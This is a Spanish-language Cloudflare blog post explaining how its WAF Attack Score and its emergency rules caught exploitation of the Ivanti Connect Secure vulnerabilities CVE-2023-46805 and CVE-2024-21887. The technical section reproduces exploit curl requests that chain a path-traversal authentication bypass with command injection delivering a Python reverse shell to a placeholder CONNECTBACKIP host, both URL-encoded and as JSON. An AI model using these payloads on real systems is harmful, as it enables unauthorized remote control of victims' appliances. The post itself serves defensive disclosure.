<div class="mb2 gray5">6 min read</div>
<div class="post-content lh-copy gray1">
	<figure class="kg-card kg-image-card"><img src="https://blog.cloudflare.com/content/images/2024/01/image1-2.png" class="kg-image" alt="How Cloudflare’s AI WAF proactively detected Ivanti Connect Secure critical zero-day vulnerability" loading="lazy" width="1800" height="1013"></figure>
	<p>La mayoría de los proveedores de WAF dependen de métodos reactivos, y responden a las vulnerabilidades una vez se han identificado y explotado. Sin embargo, creemos en la capacidad de abordar de forma proactiva los riesgos potenciales y utilizar la IA para lograrlo. Hoy analizamos un ejemplo reciente de una vulnerabilidad crítica (CVE-2023-46805 y CVE-2024-21887) y cómo nuestro sistema Attack Score impulsado por IA y las reglas de emergencia en el WAF contrarrestaron esta amenaza.</p>
	<h3 id="amenaza-cve-2023-46805-y-cve-2024-21887">Amenaza: CVE-2023-46805 y CVE-2024-21887</h3>
	<p>La plataforma AttackerKB identificó y analizó recientemente una vulnerabilidad de omisión de autenticación (<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46805">CVE-2023-46805</a>) e inyección de comandos (<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21887">CVE-2024-21887</a>) que afectaba a los productos <a href="https://attackerkb.com/topics/AdUh6by52K/cve-2023-46805/rapid7-analysis">Ivanti</a>. Esta vulnerabilidad plantea riesgos importantes que podrían llevar al acceso y control no autorizados de los sistemas afectados. En la siguiente sección explicaremos cómo se puede explotar esta vulnerabilidad.</p>
	<h3 id="an%C3%A1lisis-t%C3%A9cnico">Análisis técnico</h3>
	<p>Tal y como se analiza en la plataforma <a href="https://attackerkb.com/topics/AdUh6by52K/cve-2023-46805/rapid7-analysis">AttackerKB</a>, el atacante puede enviar una solicitud malintencionada al sistema de destino mediante un comando como este:</p><!--kg-card-begin: markdown-->
	<pre><code class="language-Python">curl -ik --path-as-is https://VICTIM/api/v1/totp/user-backup-code/../../license/keys-status/%3Bpython%20%2Dc%20%27import%20socket%2Csubprocess%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%22CONNECTBACKIP%22%2CCONNECTBACKPORT%29%29%3Bsubprocess%2Ecall%28%5B%22%2Fbin%2Fsh%22%2C%22%2Di%22%5D%2Cstdin%3Ds%2Efileno%28%29%2Cstdout%3Ds%2Efileno%28%29%2Cstderr%3Ds%2Efileno%28%29%29%27%3B
</code></pre>
	<!--kg-card-end: markdown-->
	<p>Este comando tiene como objetivo un punto final (<strong>/license/keys-status/)</strong> que normalmente está protegido mediante autenticación. Sin embargo, el atacante puede eludir la autenticación manipulando la URL para incluir <strong>/api/v1/totp/user-backup-code/../../license/keys-status/</strong>. Esta técnica se conoce como <a href="https://owasp.org/www-community/attacks/Path_Traversal">Directory Traversal</a>.</p>
	<p>La parte del comando con codificación URL se decodifica en un reverse shell en Python, que se ve así:</p><!--kg-card-begin: markdown-->
	<pre><code class="language-Python">;python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("CONNECTBACKIP",CONNECTBACKPORT));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())';
</code></pre>
	<!--kg-card-end: markdown-->
	<p>El reverse shell en Python es una forma que permite al atacante obtener control sobre el sistema objetivo.</p>
	<p>La vulnerabilidad existe en la forma en que el sistema procesa el parámetro <strong>node_name</strong>. Si un atacante puede controlar el valor de <strong>node_name</strong>, puede inyectar comandos en el sistema.</p>
	<p>El parámetro "node_name" es un componente del punto final /api/v1/license/keys-status/path:node_name. Este punto final es donde ocurre principalmente el problema.</p>
	<p>El atacante puede enviar una solicitud GET a la ruta URI <strong>/api/v1/totp/user-backup-code/../../license/keys-status/;CMD; </strong>donde CMD es cualquier comando que deseen ejecutar. El uso de un punto y coma les permite especificar este comando en la solicitud. Para garantizar que el sistema procese correctamente el comando, debe tener codificación URL.</p>
	<p>Se identificó otra vulnerabilidad de inyección de código, como se detalla en la publicación del blog de AttackerKB. Esta vez, se trataba de una inyección de comando autenticado que se encuentra en una parte diferente del sistema.</p>
	<p>Aquí se puede emplear la misma carga malintencionada del reverse shell de Python utilizada en la primera inyección de comando, creando una estructura JSON para activar la vulnerabilidad. Dado que la carga malintencionada está en JSON, no es necesario que tenga codificación URL:</p><!--kg-card-begin: markdown-->
	<pre><code class="language-JavaScript">{
    "type": ";python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"CONNECTBACKIP\",CONNECTBACKPORT));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())';",
    "txtGCPProject": "a",
    "txtGCPSecret": "a",
    "txtGCPPath": "a",
    "txtGCPBucket": "a"
}
</code></pre>
	<!--kg-card-end: markdown-->
	<p>Aunque el punto final<strong> /api/v1/system/maintenance/archiving/cloud-server-test-connection</strong> requiere autenticación, un atacante puede evitarlo encadenándolo con la vulnerabilidad Directory Traversal mencionada anteriormente. Pueden crear una ruta URI no autenticada <strong>/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection</strong> para llegar a este punto final y explotar la vulnerabilidad.</p>
	<p>Para ejecutar un comando del sistema operativo no autenticado, un atacante usaría una solicitud curl como esta:</p><!--kg-card-begin: markdown-->
	<pre><code class="language-Python">curl -ik --path-as-is https://VICTIM/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection -H 'Content-Type: application/json' --data-binary $'{ \"type\": \";python -c \'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"CONNECTBACKIP\\\",CONNECTBACKPORT));subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\';\", \"txtGCPProject\":\"a\", \"txtGCPSecret\":\"a\", \"txtGCPPath\":\"a\", \"txtGCPBucket\":\"a\" }'
</code></pre>
	<!--kg-card-end: markdown-->
	<h3 id="protecci%C3%B3n-proactiva-de-cloudflare">Protección proactiva de Cloudflare</h3>
	<p>Cloudflare WAF cuenta con el respaldo de una capa adicional impulsada por IA llamada <a href="https://blog.cloudflare.com/es-es/stop-attacks-before-they-are-known-making-the-cloudflare-waf-smarter-es-es">WAF Attack Score</a>, cuyo objetivo es detectar desviaciones de ataques incluso antes de que se hagan públicos. Attack Score proporciona una puntuación para indicar si la solicitud es maliciosa o no. Se centra en tres categorías principales hasta ahora: XSS, SQLi y algunas variaciones de RCE (Command injection, ApacheLog4J, etc.). La puntuación oscila entre 1 y 99 y cuanto menor sea la puntuación, más peligrosa será la solicitud. En términos generales, cualquier solicitud con una puntuación inferior a 20 se considera maliciosa.</p>
	<p>Echa un vistazo a los resultados del ejemplo de las vulnerabilidades anteriores, CVE-2023-46805 y CVE-2024-21887, en el panel de Cloudflare (Seguridad &gt; Incidentes). Los resultados del análisis de Attack Score constan de tres puntuaciones individuales, cada una etiquetada para indicar su relevancia para una categoría de ataque específica. También hay una puntuación global, "WAF Attack Score", que evalúa el impacto combinado de estas tres puntuaciones. En algunos casos, la puntuación global se ve afectada por una de las subpuntuaciones si el ataque coincide con una categoría. A continuación, podemos ver que la subpuntuación dominante es la ejecución remota de código "WAF RCE Attack Score".</p>
	<figure class="kg-card kg-image-card kg-width-wide"><img src="https://blog.cloudflare.com/content/images/2024/01/image2-2.png" class="kg-image" alt="Screenshot from Security Events highlighting WAF Attack Score Results showing WAF attack Score of 9" loading="lazy" width="1999" height="932"></figure>
	<p>De manera similar, para la solicitud de comando del sistema operativo no autenticado, recibimos una puntuación "WAF Attack Score: 19" del modelo de IA, que también se encuentra en la categoría de solicitud maliciosa. Vale la pena mencionar que las puntuaciones de ejemplo no son números fijos y pueden variar según la variación del ataque recibido.</p>
	<p>La buena noticia es que los clientes suscritos a los planes Enterprise y Business que hayan habilitado WAF Attack Score, junto con una regla para bloquear puntuaciones bajas (por ejemplo, <code><a href="https://developers.cloudflare.com/waf/about/waf-attack-score/#available-scores">cf.waf.score</a> le 20</code>) o (<code><a href="https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#field-cf-waf-score-class">cf.waf.score.class</a> eq</code> "<code>attack</code>") para Business, ya estaban protegidos de posibles vulnerabilidades que se han probado hasta ahora incluso antes de que se anunciara la vulnerabilidad.</p>
	<h3 id="implementaci%C3%B3n-de-reglas-de-emergencia">Implementación de reglas de emergencia</h3>
	<p>En respuesta a esta vulnerabilidad crítica, Cloudflare <a href="https://developers.cloudflare.com/waf/change-log/2024-01-17---emergency-release">implementó reglas de emergencia el 17 de enero</a> <a href="https://developers.cloudflare.com/waf/change-log/2024-01-17---emergency-release">de 2024</a>, 24 horas después de que la prueba de concepto se hiciera pública. Estas reglas son parte de sus reglas administradas para el WAF, específicamente dirigidas a la amenaza planteada por CVE-2023-46805 y una vulnerabilidad adicional, CVE-2024-21887, también relacionada con los productos Ivanti. Se han creado las reglas, denominadas "Ivanti - Auth Bypass, Command injection - CVE:CVE-2023-46805, CVE:CVE-2024-21887", para bloquear los intentos de explotar estas vulnerabilidades y proporcionar una capa adicional de seguridad a los usuarios de Cloudflare. </p>
	<p>Desde que implementamos estas reglas, hemos registrado un alto nivel de actividad. En el momento de redactar este informe, la regla se había activado más de 180 000 veces.</p><!--kg-card-begin: html-->
	<style type="text/css">
		.tg {
			border-collapse: collapse;
			border-color: #ccc;
			border-spacing: 0;
		}

		.tg td {
			background-color: #fff;
			border-color: #ccc;
			border-style: solid;
			border-width: 1px;
			color: #333;
			font-family: Arial, sans-serif;
			font-size: 14px;
			overflow: hidden;
			padding: 10px 5px;
			word-break: normal;
		}

		.tg th {
			background-color: #f0f0f0;
			border-color: #ccc;
			border-style: solid;
			border-width: 1px;
			color: #333;
			font-family: Arial, sans-serif;
			font-size: 14px;
			font-weight: normal;
			overflow: hidden;
			padding: 10px 5px;
			word-break: normal;
		}

		.tg .tg-dgl5 {
			background-color: #FFF;
			font-weight: bold;
			text-align: left;
			vertical-align: top
		}

		.tg .tg-ktyi {
			background-color: #FFF;
			text-align: left;
			vertical-align: top
		}

		.tg .tg-0lax {
			text-align: left;
			vertical-align: top
		}
	</style>
	<table class="tg" width="100%">
		<thead>
			<tr>
				<th class="tg-dgl5"><span style="font-weight:700;font-style:normal;text-decoration:none;color:#000;background-color:#FFF">Id. de regla</span></th>
				<th class="tg-dgl5"><span style="font-weight:700;font-style:normal;text-decoration:none;color:#000;background-color:#FFF">Descripción</span></th>
				<th class="tg-dgl5"><span style="font-weight:700;font-style:normal;text-decoration:none;color:#000;background-color:#FFF">Acción por defecto</span></th>
			</tr>
		</thead>
		<tbody>
			<tr>
				<td class="tg-ktyi"><span style="font-weight:400;font-style:normal;text-decoration:none;color:#000;background-color:transparent">Nueva regla administrada…34ab53c5</span></td>
				<td class="tg-0lax"><span style="font-weight:400;font-style:normal;text-decoration:none;color:#000;background-color:transparent">Ivanti - Auth Bypass, Command Injection - CVE:CVE-2023-46805, CVE:CVE-2024-21887</span></td>
				<td class="tg-0lax"><span style="font-weight:400;font-style:normal;text-decoration:none;color:#000;background-color:transparent">Bloquear</span></td>
			</tr>
			<tr>
				<td class="tg-ktyi"><span style="font-weight:400;font-style:normal;text-decoration:none;color:#000;background-color:transparent">Regla administrada heredada</span><br><span style="font-weight:400;font-style:normal;text-decoration:none;color:#000;background-color:transparent">100622</span><br></td>
				<td class="tg-0lax"><span style="font-weight:400;font-style:normal;text-decoration:none;color:#000;background-color:transparent">Ivanti - Auth Bypass, Command Injection - CVE:CVE-2023-46805, CVE:CVE-2024-21887</span></td>
				<td class="tg-0lax"><span style="font-weight:400;font-style:normal;text-decoration:none;color:#000;background-color:transparent">Bloquear</span></td>
			</tr>
		</tbody>
	</table><!--kg-card-end: html-->
	<h3 id="implicaciones-y-pr%C3%A1cticas-recomendadas">Implicaciones y prácticas recomendadas</h3>
	<p>La respuesta de Cloudflare a CVE-2023-46805 y CVE-2024-21887 destaca la importancia de contar con medidas de seguridad sólidas. Se recomienda a las organizaciones que utilizan los servicios de Cloudflare, en particular el WAF, que se aseguren de que sus sistemas estén actualizados con las últimas reglas y configuraciones para garantizar una protección óptima. También recomendamos a los clientes que implementen reglas con Attack Score para mejorar su postura de seguridad. Si deseas obtener más información sobre Attack Score, ponte en contacto con tu equipo de cuenta.</p>
	<h3 id="conclusi%C3%B3n">Conclusión</h3>
	<p>El enfoque proactivo de Cloudflare en materia de ciberseguridad con el uso de IA para identificar y detener ataques, como demuestra su respuesta a las vulnerabilidades CVE-2023-46805 y CVE-2024-21887, resalta cómo se pueden identificar las amenazas y los ataques antes de que se hagan públicos y se revelen las vulnerabilidades. La supervisión continua y la capacidad de responder rápidamente a las vulnerabilidades permiten a Cloudflare garantizar la seguridad de sus clientes en un panorama digital cada vez más complejo.</p>
</div>